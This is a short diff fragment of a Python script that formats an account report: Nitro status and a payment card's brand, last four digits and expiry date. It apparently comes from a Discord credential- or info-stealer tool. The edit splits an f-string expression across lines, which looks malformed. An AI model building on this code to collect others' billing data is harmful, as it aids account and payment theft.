@@ -256,7 +256,8 @@ if __name__ == "__main__":
                     info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}'
                     if source_data['type'] == 1 or source_data['type'] == 2:
                         if source_data['type'] == 1:
-                            info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
+                            info += f'[Card Brand]{" "*9
+}{source_data["brand"]}\n'
                             info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                             info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
                         
